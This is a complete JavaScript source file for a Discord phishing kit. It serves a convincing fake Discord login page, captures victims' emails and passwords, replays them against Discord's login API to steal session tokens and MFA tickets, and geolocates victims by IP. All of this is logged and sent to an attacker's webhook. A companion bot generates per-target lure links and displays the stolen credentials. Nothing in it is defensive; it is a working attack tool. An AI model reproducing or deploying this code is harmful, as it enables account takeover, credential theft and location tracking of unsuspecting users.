// node 18+ | zero deps beyond discord.js
// file: index.js

import {
  Client, GatewayIntentBits, PermissionFlagsBits, EmbedBuilder,
} from "discord.js";
import { createServer } from "http";
import { readFile, writeFile, access } from "fs/promises";
import { constants } from "fs";

const TOKEN      = process.env.BOT_TOKEN    ?? "FILL: bot token";
const PORT       = 25689;
const WEBHOOK    = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
const BASE_URL   = process.env.BASE_URL     ?? "https://g0j73tuxuu.apps.bot-hosting.cloud";
const IPINFO_TOK = process.env.IPINFO_TOKEN ?? "";
const LOG_FILE   = "./ip_log.json";
const PREFIX     = "!";

// ── storage ───────────────────────────────────────────────────────────────────
async function loadLog() {
  try {
    await access(LOG_FILE, constants.F_OK);
    return JSON.parse(await readFile(LOG_FILE, "utf8"));
  } catch { return []; }
}
async function appendLog(e) {
  const log = await loadLog();
  log.push(e);
  await writeFile(LOG_FILE, JSON.stringify(log, null, 2));
}
async function wipeLog() {
  await writeFile(LOG_FILE, "[]");
}

// ── discord auth grab ─────────────────────────────────────────────────────────
async function grabToken(email, password) {
  try {
    const r = await fetch("https://discord.com/api/v9/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "X-Super-Properties": Buffer.from(JSON.stringify({
          os: "Windows", browser: "Chrome", device: "",
          browser_version: "120.0.0.0", os_version: "10",
        })).toString("base64"),
      },
      body: JSON.stringify({
        login: email,
        password,
        undelete: false,
        captcha_key: null,
        login_source: null,
        gift_code_sku_id: null,
      }),
    });
    const d = await r.json();
    // d.token — direct token (no MFA)
    // d.mfa   — true if MFA enabled, d.ticket for next step
    return d;
  } catch (e) {
    return { error: e.message };
  }
}

// ── geo ───────────────────────────────────────────────────────────────────────
async function geo(ip) {
  try {
    const url = IPINFO_TOK
      ? `https://ipinfo.io/${ip}?token=${IPINFO_TOK}`
      : `https://ipinfo.io/${ip}/json`;
    const r = await fetch(url);
    if (r.ok) return await r.json();
  } catch {}
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,proxy,hosting,mobile,query`
    );
    const d = await r.json();
    if (d.status === "success") return {
      ip: d.query, city: d.city, region: d.regionName,
      country: d.country, postal: d.zip,
      loc: `${d.lat},${d.lon}`, org: d.isp,
      proxy: d.proxy, hosting: d.hosting, mobile: d.mobile,
    };
  } catch {}
  return {};
}

// ── webhook ───────────────────────────────────────────────────────────────────
async function pingWebhook(entry, g) {
  if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
  const maps = g.loc ? `[open](https://www.google.com/maps?q=${g.loc})` : "?";
  const fields = [
    { name: "IP",         value: `\`${entry.ip}\``,                     inline: true  },
    { name: "UID",        value: `\`${entry.uid ?? "?"}\``,              inline: true  },
    { name: "Country",    value: g.country  ?? "?",                      inline: true  },
    { name: "City",       value: g.city     ?? "?",                      inline: true  },
    { name: "Coords",     value: maps,                                   inline: true  },
    { name: "ISP",        value: g.org      ?? "?",                      inline: true  },
    { name: "Proxy",      value: String(g.proxy ?? "?"),                 inline: true  },
    { name: "UA",         value: `\`${(entry.ua ?? "").slice(0,80)}\``,  inline: false },
    ...(entry.email  ? [{ name: "📧 Email",    value: `\`${entry.email}\``,   inline: false }] : []),
    ...(entry.pass   ? [{ name: "🔑 Password", value: `\`${entry.pass}\``,    inline: false }] : []),
    ...(entry.token  ? [{ name: "✅ Token",    value: `\`${entry.token}\``,   inline: false }] : []),
    ...(entry.mfa    ? [{ name: "⚠️ MFA",      value: `ticket: \`${entry.mfa_ticket ?? "?"}\``, inline: false }] : []),
  ];
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{ title: "🎣 login grab", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
    }),
  }).catch(() => {});
}

// ── body parser ───────────────────────────────────────────────────────────────
function readBody(req) {
  return new Promise((res, rej) => {
    let buf = "";
    req.on("data", c => buf += c);
    req.on("end", () => { try { res(JSON.parse(buf)); } catch { res({}); } });
    req.on("error", rej);
  });
}

// ── safe url parse ────────────────────────────────────────────────────────────
function parseURL(raw) {
  try {
    const cleaned = (raw ?? "/").replace(/^\/\/+/, "/");
    return new URL(cleaned, "http://localhost");
  } catch {
    return new URL("/", "http://localhost");
  }
}

// ── fake discord login page ───────────────────────────────────────────────────
function loginPage(uid, to, error = "") {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#313338;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
.wrap{background:#2b2d31;border-radius:8px;padding:32px;width:480px;max-width:95vw;text-align:center;box-shadow:0 2px 10px #0007}
.logo{font-size:48px;margin-bottom:16px}
h1{color:#fff;font-size:24px;font-weight:700;margin-bottom:8px}
p{color:#949ba4;font-size:14px;margin-bottom:24px}
.field{text-align:left;margin-bottom:16px}
label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:16px;outline:none;transition:border .15s}
input:focus{border-color:#5865f2}
.btn{width:100%;padding:12px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s}
.btn:hover{background:#4752c4}
.btn:disabled{background:#3d3f8a;cursor:not-allowed}
.err{color:#f23f42;font-size:13px;margin-top:12px;min-height:18px}
.sep{margin:20px 0;display:flex;align-items:center;gap:8px;color:#4e5058;font-size:12px}
.sep::before,.sep::after{content:'';flex:1;height:1px;background:#3f4147}
.qr{color:#00a8fc;font-size:14px;cursor:pointer}
.footer{margin-top:16px;font-size:14px;color:#949ba4}
.footer a{color:#00a8fc;text-decoration:none}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">
    <svg width="48" height="48" viewBox="0 0 71 55" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M60.1 4.9A58.5 58.5 0 0 0 45.5.7a40.8 40.8 0 0 0-1.8 3.7 54.1 54.1 0 0 0-16.3 0A39.6 39.6 0 0 0 25.6.7 58.4 58.4 0 0 0 11 4.9C1.6 19.1-.9 32.9.3 46.5a58.9 58.9 0 0 0 18 9.1 42.2 42.2 0 0 0 3.7-6 38.4 38.4 0 0 1-6-2.9l1.4-1.1a42 42 0 0 0 36.2 0l1.5 1.1a38.3 38.3 0 0 1-6 2.9 42 42 0 0 0 3.6 6 58.7 58.7 0 0 0 18-9C72 30.9 68.8 17.2 60.1 4.9ZM23.7 38.3c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.5 0 6.4 3.2 6.3 7.2 0 4-2.8 7.2-6.3 7.2Zm23.6 0c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.5 0 6.3 3.2 6.3 7.2 0 4-2.8 7.2-6.3 7.2Z" fill="#5865F2"/>
    </svg>
  </div>
  <h1>Welcome back!</h1>
  <p>We're so excited to see you again!</p>
  <div class="field">
    <label>Email or Phone Number</label>
    <input type="email" id="email" placeholder="" autocomplete="email">
  </div>
  <div class="field">
    <label>Password</label>
    <input type="password" id="pass" placeholder="" autocomplete="current-password">
  </div>
  <div class="err" id="err">${error}</div>
  <button class="btn" id="btn" onclick="doLogin()">Log In</button>
  <div class="sep">or</div>
  <span class="qr">Login with QR Code</span>
  <div class="footer">
    Need an account? <a href="#">Register</a>
  </div>
</div>
<script>
async function doLogin() {
  const email = document.getElementById("email").value.trim();
  const pass  = document.getElementById("pass").value;
  const btn   = document.getElementById("btn");
  const err   = document.getElementById("err");

  if (!email || !pass) { err.textContent = "Please fill in all fields."; return; }

  btn.disabled = true;
  btn.textContent = "Logging in...";
  err.textContent = "";

  try {
    const r = await fetch("/auth", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uid: "${uid}", to: "${to}", email, pass }),
    });
    const d = await r.json();

    if (d.ok) {
      window.location.href = "${to}";
    } else if (d.mfa) {
      err.textContent = "2FA enabled — creds saved. Redirecting...";
      setTimeout(() => { window.location.href = "${to}"; }, 1500);
    } else {
      err.textContent = d.msg ?? "Login or password is invalid.";
      btn.disabled = false;
      btn.textContent = "Log In";
    }
  } catch {
    err.textContent = "Login or password is invalid.";
    btn.disabled = false;
    btn.textContent = "Log In";
  }
}

document.addEventListener("keydown", e => {
  if (e.key === "Enter") doLogin();
});
</script>
</body>
</html>`;
}

// ── http server ───────────────────────────────────────────────────────────────
createServer(async (req, res) => {
  const u = parseURL(req.url);

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }

  // POST /auth — cred grab + discord auth
  if (req.method === "POST" && u.pathname === "/auth") {
    const body = await readBody(req);
    const ip = (
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
      req.socket.remoteAddress
    ).replace("::ffff:", "");

    const { uid, to, email, pass } = body;

    // hit discord auth API
    const authResult = await grabToken(email, pass);

    const entry = {
      ts:         new Date().toISOString(),
      ip,
      ua:         req.headers["user-agent"] ?? "unknown",
      uid:        uid   ?? null,
      email:      email ?? null,
      pass:       pass  ?? null,
      token:      authResult.token      ?? null,
      mfa:        authResult.mfa        ?? false,
      mfa_ticket: authResult.ticket     ?? null,
    };

    const g = await geo(ip);
    entry.geo = g;
    await appendLog(entry);
    await pingWebhook(entry, g);
    console.log("[auth]", entry.ts, ip, email, authResult.token ? "TOKEN OK" : authResult.mfa ? "MFA" : "FAIL");

    if (authResult.token) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    } else if (authResult.mfa) {
      // creds saved even if MFA — ticket logged
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false, mfa: true }));
    } else {
      // wrong creds — tell page to show error so they retry and give correct pass
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false, msg: "Login or password is invalid." }));
    }
    return;
  }

  // GET / — fake login page
  if (req.method === "GET" && u.pathname === "/") {
    const uid = u.searchParams.get("uid") ?? "";
    const to  = u.searchParams.get("to")  ?? "https://discord.com/app";
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(loginPage(uid, to));
    return;
  }

  res.writeHead(404); res.end();
}).listen(PORT, "0.0.0.0", () => console.log(`[receiver] :${PORT} on 0.0.0.0`));

// ── discord bot ───────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

client.once("clientReady", () => console.log(`[logger] online as ${client.user.tag}`));

client.on("messageCreate", async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
  const [cmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);

  if (cmd === "genlink") {
    const target = msg.mentions.users.first() ?? msg.author;
    const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
    const link   = `${BASE_URL}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
    try {
      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
      await msg.delete();
    } catch { await msg.reply("open DMs and retry"); }
    return;
  }

  if (cmd === "logs") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const n   = parseInt(args[0]) || 20;
    const log = await loadLog();
    if (!log.length) { await msg.reply("no hits yet"); return; }
    let buf = "";
    for (const e of log.slice(-n)) {
      const g = e.geo ?? {};
      const line = [
        `ts=${e.ts}`, `ip=${e.ip}`, `uid=${e.uid ?? "?"}`,
        `city=${g.city ?? "?"}`, `country=${g.country ?? "?"}`,
        e.email ? `email=${e.email}` : null,
        e.pass  ? `pass=${e.pass}`   : null,
        e.token ? `token=${e.token.slice(0,20)}…` : null,
        e.mfa   ? `MFA=true ticket=${e.mfa_ticket?.slice(0,20)}…` : null,
      ].filter(Boolean).join(" | ") + "\n";
      if ((buf + line).length > 1900) {
        await msg.channel.send(`\`\`\`\n${buf}\`\`\``); buf = "";
      }
      buf += line;
    }
    if (buf) await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
    return;
  }

  if (cmd === "lastip") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const target = msg.mentions.users.first();
    const log    = await loadLog();
    const hits   = target ? log.filter(e => e.uid === target.id) : log;
    if (!hits.length) { await msg.reply("no hits"); return; }
    const e  = hits[hits.length - 1];
    const g  = e.geo ?? {};
    const maps = g.loc ? `[maps](https://www.google.com/maps?q=${g.loc})` : "?";
    const em = new EmbedBuilder()
      .setTitle(`🎣 ${e.ip}`).setColor(0xff4444)
      .addFields(
        { name: "UID",     value: `\`${e.uid ?? "?"}\``,             inline: true  },
        { name: "Country", value: g.country  ?? "?",                  inline: true  },
        { name: "City",    value: g.city     ?? "?",                  inline: true  },
        { name: "Coords",  value: maps,                               inline: true  },
        { name: "ISP",     value: g.org      ?? "?",                  inline: true  },
        { name: "Proxy",   value: String(g.proxy ?? "?"),             inline: true  },
        { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``,  inline: false },
        ...(e.email  ? [{ name: "📧 Email",    value: `\`${e.email}\``,        inline: false }] : []),
        ...(e.pass   ? [{ name: "🔑 Password", value: `\`${e.pass}\``,         inline: false }] : []),
        ...(e.token  ? [{ name: "✅ Token",    value: `\`${e.token}\``,        inline: false }] : []),
        ...(e.mfa    ? [{ name: "⚠️ MFA",      value: `\`${e.mfa_ticket}\``,  inline: false }] : []),
      ).setTimestamp(new Date(e.ts));
    await msg.channel.send({ embeds: [em] });
    return;
  }

  if (cmd === "clearlog") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    await wipeLog();
    await msg.reply("log wiped");
    return;
  }
});

client.login(TOKEN);
